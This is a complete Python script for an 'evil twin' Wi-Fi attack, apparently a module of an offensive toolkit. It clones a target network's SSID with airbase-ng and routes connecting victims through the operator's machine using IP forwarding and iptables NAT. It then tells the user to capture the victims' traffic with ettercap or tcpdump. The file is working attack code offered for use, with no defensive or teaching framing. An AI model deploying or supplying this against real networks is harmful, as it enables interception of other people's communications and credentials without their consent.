#!/usr/bin/env python3
# Evil Twin Attack Module

import os, sys, time, subprocess

def run():
    print("\n" + "="*60)
    print("EVIL TWIN ATTACK")
    print("="*60)
    
    interface = input("WiFi interface [wlan0]: ").strip() or "wlan0"
    target_ssid = input("Target SSID to clone: ").strip()
    target_bssid = input("Target BSSID (optional): ").strip()
    
    print(f"\nSetting up Evil Twin AP:")
    print(f"  Interface: {interface}")
    print(f"  Target SSID: {target_ssid}")
    print("Press Ctrl+C to stop")
    
    try:
        os.system(f"sudo airmon-ng start {interface}")
        mon_interface = f"{interface}mon"
        
        cmd = f"airbase-ng -e '{target_ssid}' -c 6 {mon_interface}"
        if target_bssid:
            cmd += f" -a {target_bssid}"
        print(f"Running: {cmd}")
        
        proc = subprocess.Popen(cmd.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
        os.system(f"ifconfig at0 up")
        os.system(f"ifconfig at0 10.0.0.1 netmask 255.255.255.0")
        os.system("iptables --flush")
        os.system("iptables -t nat --flush")
        os.system("iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE")
        os.system("iptables -A FORWARD -i at0 -o eth0 -j ACCEPT")
        
        print("\nEvil Twin running!")
        print("Victims will connect to fake AP")
        print("Use ettercap or tcpdump to capture traffic")
        
        while True:
            time.sleep(1)
            
    except KeyboardInterrupt:
        print("\nShutting down Evil Twin...")
        proc.terminate()
        os.system("iptables --flush")
        os.system("iptables -t nat --flush")
        os.system("airmon-ng stop " + mon_interface)
        print("Done")
    except:
        print("airbase-ng not installed")
        print("Install aircrack-ng: sudo apt install aircrack-ng")

if __name__ == "__main__":
    run()